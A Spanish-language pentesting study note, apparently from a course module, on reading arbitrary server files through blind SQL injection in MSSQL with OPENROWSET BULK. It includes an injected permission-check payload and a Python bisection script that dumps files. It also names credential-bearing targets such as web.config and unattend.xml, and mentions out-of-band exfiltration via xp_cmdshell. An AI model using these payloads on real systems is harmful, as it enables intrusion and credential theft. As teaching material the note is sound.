---
tags:
  - Web/Red-Team
  - SQLi
  - Pentesting/Enumeracion
Fecha de actualización: 2026-06-04
Nota previa: "[[11 - MSSQL robo de hashes NetNTLM]]"
Nota siguiente: "[[13 - Herramientas para Blind SQLi]]"
Area: "[[SQL Injection.base|SQL Injection]]"
---
---

Con los permisos adecuados, una SQLi en MSSQL permite leer ficheros arbitrarios del servidor —el equivalente al [[07 - Lectura de archivos|`LOAD_FILE` de MySQL]]—. La función es `OPENROWSET` con una operación `BULK`, y la lectura a ciegas reutiliza el [[03 - Diseño del oráculo booleano|oráculo]] que ya tenemos.

# `OPENROWSET` con `BULK`

`OPENROWSET(BULK '<ruta>', SINGLE_CLOB)` carga el contenido de un fichero como una columna (`BulkColumn`):

```sql
-- Longitud del fichero
SELECT LEN(BulkColumn) FROM OPENROWSET(BULK 'C:\Windows\System32\flag.txt', SINGLE_CLOB) AS x

-- Contenido del fichero
SELECT BulkColumn FROM OPENROWSET(BULK 'C:\Windows\System32\flag.txt', SINGLE_CLOB) AS x
```

<mark style="background: #ADCCFFA6;">El modo determina el tipo de dato leído</mark>: `SINGLE_CLOB` (texto, `varchar`), `SINGLE_NCLOB` (`nvarchar`, para Unicode) y `SINGLE_BLOB` (`varbinary`, para binarios).

# Comprobar permisos

Cualquier usuario puede usar `OPENROWSET`, pero las operaciones `BULK` exigen `ADMINISTER BULK OPERATIONS` o `ADMINISTER DATABASE BULK OPERATIONS`. Se verifica con `fn_my_permissions`:

```sql
maria' AND (SELECT COUNT(*) FROM fn_my_permissions(NULL,'DATABASE')
  WHERE permission_name IN ('ADMINISTER BULK OPERATIONS','ADMINISTER DATABASE BULK OPERATIONS'))>0;--
```

Si el oráculo da verdadero (`taken`), tenemos el privilegio.

# Leer el fichero a ciegas

Como no vemos la salida, se adapta el script de [[04 - Extracción de datos boolean-based|extracción boolean]] (con [[05 - Optimización de la extracción|bisección]]) para que el "dato" sea el contenido del fichero:

```python
file_path = 'C:\\Windows\\System32\\flag.txt'

# Longitud del contenido (empieza en 0 por si está vacío; tope de guarda)
length = 0
while length < 100000 and not oracle(f"(SELECT LEN(BulkColumn) FROM OPENROWSET(BULK '{file_path}', SINGLE_CLOB) AS x)={length}"):
    length += 1
print(f"[*] File length = {length}")

# Volcado por bisección
print("[*] File = ", end='')
for i in range(1, length + 1):
    low, high = 0, 127
    while low <= high:
        mid = (low + high) // 2
        q = (f"(SELECT ASCII(SUBSTRING(BulkColumn,{i},1)) "
             f"FROM OPENROWSET(BULK '{file_path}', SINGLE_CLOB) AS x) BETWEEN {low} AND {mid}")
        if oracle(q):
            high = mid - 1
        else:
            low = mid + 1
    print(chr(low), end='')
    sys.stdout.flush()
print()
```

<mark style="background: #8000E1A6;">La única diferencia con volcar una columna de la base de datos es la consulta interna</mark>: en lugar de `SELECT password FROM users`, leemos `BulkColumn` del fichero. El oráculo, la longitud y el algoritmo son idénticos —demostración de por qué construir buenos helpers reutilizables compensa—.

> [!info]+
> **Ficheros de alto valor en MSSQL/Windows**: `web.config` (cadenas de conexión con credenciales), `C:\inetpub\wwwroot\` (código fuente), ficheros de configuración de la app, y `unattend.xml`/`sysprep.inf` (credenciales de despliegue). Leer el código fuente convierte una caja negra en caja blanca, igual que en [[07 - Lectura de archivos|MySQL]]. <mark style="background: #FFB8EBA6;">Si el contenido sale truncado o con caracteres extraños (ficheros UTF-16 o con BOM, como algunos `web.config` de IIS), prueba `SINGLE_NCLOB` en lugar de `SINGLE_CLOB`.</mark>

> [!warning]+
> La lectura por bisección a ciegas es **lenta** (7 peticiones por carácter); un `web.config` de varios KB puede tardar mucho. Si además tienes [[10 - MSSQL ejecución de comandos con xp_cmdshell|RCE]], `xp_cmdshell 'type C:\...\web.config'` exfiltrado por [[09 - Exfiltración Out-of-Band por DNS|OOB]] es mucho más rápido. Elige el canal según los privilegios y el tamaño del objetivo.

Cubiertas las técnicas manuales, el cierre del módulo repasa las herramientas que automatizan todo esto: [[13 - Herramientas para Blind SQLi]].
